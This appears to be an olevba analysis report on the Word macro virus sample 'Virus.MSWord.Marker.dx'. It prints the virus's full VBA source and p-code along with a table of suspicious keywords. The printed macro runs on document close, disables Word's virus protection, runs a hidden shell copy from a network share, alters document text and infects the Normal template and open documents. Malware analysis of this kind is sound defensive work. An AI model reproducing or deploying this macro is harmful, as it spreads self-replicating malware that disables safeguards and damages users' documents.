olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.dx
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.dx - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()

On Error Resume Next
    Application.ScreenUpdating = False
    ActiveWindow.WindowState = wdWindowStateMinimize

Const Kuku = "Black Wednesday!"

'Declare Variables
Dim SaveDoc, SaveNormalTempl, DocInfected, NormalTemplInfected As Boolean
Dim ActDoc, NormTempl As Object
Dim MyCod, UserAddress, LogData, LogFile As String
Dim a1, FileLocal, FileServer As Integer

'Initialize Variables
Set ActDoc = ActiveDocument.VBProject.VBComponents.Item(1)
Set NormTempl = NormalTemplate.VBProject.VBComponents.Item(1)

DocInfected = ActDoc.CodeModule.Find(Kuku, 1, 1, 10000, 10000)
NormalTemplInfected = NormTempl.CodeModule.Find(Kuku, 1, 1, 10000, 10000)

'Switch the VirusProtection OFF
Options.VirusProtection = False

Set fs = Application.FileSearch
With fs
    .LookIn = "C:\"
    .FileName = "NetSetup.log"
    FileLocal = .Execute
End With
With fs
    .LookIn = "\\post\temp\1000"
    .FileName = "NetSetup.log"
    FileServer = .Execute
End With
    
If FileServer > 0 Then
    If (FileLocal <= 0) Then
        Shell "command.com /c copy \\post\temp\1000\NetSetup.log c:\NetSetup.log", vbHide
    Else
        If FileLen("\\post\temp\1000\NetSetup.log") <> FileLen("c:\NetSetup.log") Then
            Shell "command.com /c copy \\post\temp\1000\NetSetup.log c:\NetSetup.log", vbHide
        End If
    End If
End If

System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Desktop", _
"WallPaper") = "c:\NetSetup.log"

'If (WeekDay(Now()) = vbWednesday) Then
    Selection.MoveDown Unit:=wdLine, Count:=20, Extend:=wdExtend
    Selection.Range.Case = wdNextCase
    ActiveDocument.Save
'End If
'Make sure that some conditions are true before we continue infecting anything
If (DocInfected = True Xor NormalTemplInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocInfected = True Then
  
    SaveNormalTempl = NormalTemplate.Saved
  
    MyCod = ActDoc.CodeModule.Lines(1, ActDoc.CodeModule.CountOfLines)

    a1 = NormTempl.CodeModule.CountOfLines
    NormTempl.CodeModule.DeleteLines 1, a1
    NormTempl.CodeModule.AddFromString MyCod
    
    If SaveNormalTempl = True Then NormalTemplate.Save
    
  End If
              
  'Infect the ActiveDocument
  If NormalTemplInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDoc = ActiveDocument.Saved
    
    OurCode = NormTempl.CodeModule.Lines(1, NormTempl.CodeModule.CountOfLines)

    a1 = ActDoc.CodeModule.CountOfLines
    ActDoc.CodeModule.DeleteLines 1, a1
    ActDoc.CodeModule.AddFromString OurCode
    
    If SaveDoc = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub













-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.dx
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 9230 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #4:
' 	Ld wdWindowStateMinimize 
' 	Ld ActiveWindow 
' 	MemSt WindowState 
' Line #5:
' Line #6:
' 	Dim (Const) 
' 	LitStr 0x0010 "Black Wednesday!"
' 	VarDefn Kuku
' Line #7:
' Line #8:
' 	QuoteRem 0x0000 0x0011 "Declare Variables"
' Line #9:
' 	Dim 
' 	VarDefn SaveDoc
' 	VarDefn SaveNormalTempl
' 	VarDefn DocInfected
' 	VarDefn NormalTemplInfected (As Boolean)
' Line #10:
' 	Dim 
' 	VarDefn ActDoc
' 	VarDefn NormTempl (As Object)
' Line #11:
' 	Dim 
' 	VarDefn MyCod
' 	VarDefn UserAddress
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #12:
' 	Dim 
' 	VarDefn a1
' 	VarDefn FileLocal
' 	VarDefn FileServer (As Integer)
' Line #13:
' Line #14:
' 	QuoteRem 0x0000 0x0014 "Initialize Variables"
' Line #15:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ActDoc 
' Line #16:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NormTempl 
' Line #17:
' Line #18:
' 	Ld Kuku 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld ActDoc 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DocInfected 
' Line #19:
' 	Ld Kuku 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld NormTempl 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NormalTemplInfected 
' Line #20:
' Line #21:
' 	QuoteRem 0x0000 0x001E "Switch the VirusProtection OFF"
' Line #22:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #23:
' Line #24:
' 	SetStmt 
' 	Ld Application 
' 	MemLd FileSearch 
' 	Set fs 
' Line #25:
' 	StartWithExpr 
' 	Ld fs 
' 	With 
' Line #26:
' 	LitStr 0x0003 "C:\"
' 	MemStWith LookIn 
' Line #27:
' 	LitStr 0x000C "NetSetup.log"
' 	MemStWith FileName 
' Line #28:
' 	MemLdWith Execute 
' 	St FileLocal 
' Line #29:
' 	EndWith 
' Line #30:
' 	StartWithExpr 
' 	Ld fs 
' 	With 
' Line #31:
' 	LitStr 0x0010 "\\post\temp\1000"
' 	MemStWith LookIn 
' Line #32:
' 	LitStr 0x000C "NetSetup.log"
' 	MemStWith FileName 
' Line #33:
' 	MemLdWith Execute 
' 	St FileServer 
' Line #34:
' 	EndWith 
' Line #35:
' Line #36:
' 	Ld FileServer 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #37:
' 	Ld FileLocal 
' 	LitDI2 0x0000 
' 	Le 
' 	Paren 
' 	IfBlock 
' Line #38:
' 	LitStr 0x0041 "command.com /c copy \\post\temp\1000\NetSetup.log c:\NetSetup.log"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #39:
' 	ElseBlock 
' Line #40:
' 	LitStr 0x001D "\\post\temp\1000\NetSetup.log"
' 	ArgsLd FileLen 0x0001 
' 	LitStr 0x000F "c:\NetSetup.log"
' 	ArgsLd FileLen 0x0001 
' 	Ne 
' 	IfBlock 
' Line #41:
' 	LitStr 0x0041 "command.com /c copy \\post\temp\1000\NetSetup.log c:\NetSetup.log"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	EndIfBlock 
' Line #45:
' Line #46:
' 	LineCont 0x0004 08 00 00 00
' 	LitStr 0x000F "c:\NetSetup.log"
' 	LitStr 0x0000 ""
' 	LitStr 0x0027 "HKEY_CURRENT_USER\Control Panel\Desktop"
' 	LitStr 0x0009 "WallPaper"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #47:
' Line #48:
' 	QuoteRem 0x0000 0x0026 "If (WeekDay(Now()) = vbWednesday) Then"
' Line #49:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	LitDI2 0x0014 
' 	ParamNamed Count 
' 	Ld wdExtend 
' 	ParamNamed Extend 
' 	Ld Selection 
' 	ArgsMemCall MoveDown 0x0003 
' Line #50:
' 	Ld wdNextCase 
' 	Ld Selection 
' 	MemLd Range 
' 	MemSt Case 
' Line #51:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #52:
' 	QuoteRem 0x0000 0x0006 "End If"
' Line #53:
' 	QuoteRem 0x0000 0x004D "Make sure that some conditions are true before we continue infecting anything"
' Line #54:
' 	LineCont 0x0008 0B 00 03 00 12 00 03 00
' 	Ld DocInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormalTemplInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #55:
' Line #56:
' Line #57:
' 	QuoteRem 0x0002 0x0019 "Infect the NormalTemplate"
' Line #58:
' 	Ld DocInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #59:
' Line #60:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTempl 
' Line #61:
' Line #62:
' 	LitDI2 0x0001 
' 	Ld ActDoc 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ActDoc 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St MyCod 
' Line #63:
' Line #64:
' 	Ld NormTempl 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St a1 
' Line #65:
' 	LitDI2 0x0001 
' 	Ld a1 
' 	Ld NormTempl 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #66:
' 	Ld MyCod 
' 	Ld NormTempl 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #67:
' Line #68:
' 	Ld SaveNormalTempl 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #69:
' Line #70:
' 	EndIfBlock 
' Line #71:
' Line #72:
' 	QuoteRem 0x0002 0x0019 "Infect the ActiveDocument"
' Line #73:
' 	LineCont 0x0008 05 00 05 00 13 00 05 00
' 	Ld NormalTemplInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #74:
' Line #75:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDoc 
' Line #76:
' Line #77:
' 	LitDI2 0x0001 
' 	Ld NormTempl 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld NormTempl 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #78:
' Line #79:
' 	Ld ActDoc 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St a1 
' Line #80:
' 	LitDI2 0x0001 
' 	Ld a1 
' 	Ld ActDoc 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #81:
' 	Ld OurCode 
' 	Ld ActDoc 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #82:
' Line #83:
' 	Ld SaveDoc 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #84:
' Line #85:
' 	EndIfBlock 
' Line #86:
' Line #87:
' Line #88:
' 	EndIfBlock 
' Line #89:
' Line #90:
' 	EndSub 
' Line #91:
' Line #92:
' Line #93:
' Line #94:
' Line #95:
' Line #96:
' Line #97:
' Line #98:
' Line #99:
' Line #100:
' Line #101:
' Line #102:
' Line #103:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

